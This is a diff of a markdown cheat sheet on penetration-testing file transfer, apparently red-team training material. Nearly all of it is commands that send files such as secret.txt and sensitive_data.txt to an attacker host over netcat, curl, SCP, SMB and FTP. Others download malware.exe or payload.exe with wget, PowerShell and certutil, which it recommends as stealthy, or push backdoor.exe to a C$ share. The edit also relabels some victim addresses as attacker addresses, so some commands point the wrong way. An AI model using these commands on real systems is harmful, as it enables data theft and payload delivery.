@@ -1,135 +1,123 @@
+# File Transfer Techniques
+
 | Method | When to use |
 |---|---|
 | `python3 -m http.server` | Fastest for pulling files to attacker from Linux target |
 | `impacket-smbserver share .` | Windows targets — mount as a drive letter |
-| `curl -T file http://attacker/upload` | Pushing files to attacker-controlled server |
-| `nc -w3 attacker 4444 < file` | Simple, no dependencies |
-| Certutil (Windows) | `certutil -urlcache -split -f http://attacker/file out` |
+| `curl -T file http://<attacker-ip>/upload` | Pushing files to attacker-controlled server |
+| `nc -w3 <attacker-ip> 4444 < file` | Simple, no dependencies |
+| Certutil (Windows) | `certutil -urlcache -split -f http://<attacker-ip>/file out` |
 | DNS exfil | When only port 53 outbound is allowed |
 
 !!! tip "Tip"
     For Windows file transfers, `certutil` and `bitsadmin` are LOLBins — no dropped binaries. `certutil -urlcache -split -f <url> <output>` works on most Windows versions.
 
-### Using Netcat for File Transfers
+---
 
-Netcat (`nc`) is a simple and efficient way to transfer files between systems.
+## Netcat
 
-#### Linux to Linux
-
-Sender:
+### Linux to Linux
 
 ```bash
+# Sender
 nc -lvnp 4444 < secret.txt
+
+# Receiver
+nc <attacker-ip> 4444 > retrieved.txt
 ```
 
-Receiver:
-
-```bash
-nc attacker_ip 4444 > retrieved.txt
-```
-
-##### Windows to Linux
-
-Sender (Windows PowerShell):
+### Windows to Linux
 
 ```powershell
-Get-Content C:\Users\Public\secret.txt | nc -w 3 attacker_ip 4444
+# Sender (Windows PowerShell)
+Get-Content C:\Users\Public\secret.txt | nc -w 3 <attacker-ip> 4444
 ```
 
-Receiver (Linux):
-
 ```bash
+# Receiver (Linux)
 nc -lvnp 4444 > retrieved.txt
 ```
 
-### Using SCP for Secure Transfers
+---
 
-SCP (Secure Copy Protocol) uses SSH for secure file transfers.
+## SCP
 
-#### Linux to Linux
+### Linux to Linux
 
 ```bash
-scp secret.txt user@remote_ip:/tmp/
+scp secret.txt <user>@<attacker-ip>:/tmp/
 ```
 
-#### Windows to Linux using WinSCP
-
-WinSCP provides a graphical interface for SCP transfers.
-
-PowerShell equivalent:
+### Windows to Linux
 
 ```powershell
-scp C:\Users\Public\secret.txt user@attacker_ip:/home/user/
+scp C:\Users\Public\secret.txt <user>@<attacker-ip>:/home/<user>/
 ```
 
-### Using SMB for Windows File Transfers
+---
 
-If SMB is enabled, it can be used to transfer files between Windows systems.
+## SMB
 
-#### Mapping a Network Drive
+### Map a Network Drive (Windows)
 
 ```powershell
-net use \\attacker_ip\shared_folder /user:attacker secretpassword
-copy C:\sensitive_data.txt \\attacker_ip\shared_folder\
+net use \\<attacker-ip>\shared_folder /user:attacker secretpassword
+copy C:\sensitive_data.txt \\<attacker-ip>\shared_folder\
 ```
 
-#### Using SMBClient on Linux
+### SMBClient (Linux)
 
 ```bash
-smbclient -U user //victim_ip/C$ -c 'put backdoor.exe'
+smbclient -U <user> //<attacker-ip>/C$ -c 'put backdoor.exe'
 ```
 
-### Using FTP for Transfers
+---
 
-If an FTP server is available, it can be used to transfer files.
+## FTP
 
-### Uploading via FTP (Interactive)
+### Interactive Upload
 
 ```bash
-ftp victim_ip
-# Enter credentials
+ftp 10.10.10.10
 put secret.txt
 ```
 
-#### Automating FTP with PowerShell
+### Automated via PowerShell
 
 ```powershell
 $WebClient = New-Object System.Net.WebClient
-$WebClient.UploadFile("ftp://attacker_ip/secret.txt", "C:\sensitive.txt")
+$WebClient.UploadFile("ftp://<attacker-ip>/secret.txt", "C:\sensitive.txt")
 ```
 
-### Using HTTP(S) for File Transfers
+---
 
-#### Downloading a File with cURL
+## HTTP
 
-```bash
-curl http://attacker_ip/malware.exe -o C:\Users\Public\malware.exe
-```
-
-#### Python Simple HTTP Server for Quick Transfers
+### Python HTTP Server (attacker-side)
 
 ```bash
 python3 -m http.server 8000
 ```
 
-On the target:
+### Download on Target
 
 ```bash
-wget http://attacker_ip:8000/secret.txt -O /tmp/secret.txt
+wget http://<attacker-ip>:8000/secret.txt -O /tmp/secret.txt
+curl http://<attacker-ip>/malware.exe -o /tmp/malware.exe
 ```
 
-### Using PowerShell for File Transfers
+---
 
-#### Download a File from a Remote Server
+## PowerShell
+
+### Download File
 
 ```powershell
-Invoke-WebRequest -Uri "http://attacker_ip/malware.exe" -OutFile "C:\Users\Public\malware.exe"
+Invoke-WebRequest -Uri "http://<attacker-ip>/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"
 ```
 
-#### Using Certutil for Stealthy Downloads
+### Certutil Stealthy Download
 
 ```powershell
-certutil -urlcache -f http://attacker_ip/payload.exe C:\Windows\Temp\payload.exe
+certutil -urlcache -f http://<attacker-ip>/payload.exe C:\Windows\Temp\payload.exe
 ```
-
-These techniques provide different levels of security and stealth, making them useful in various scenarios for file transfer and data exfiltration.
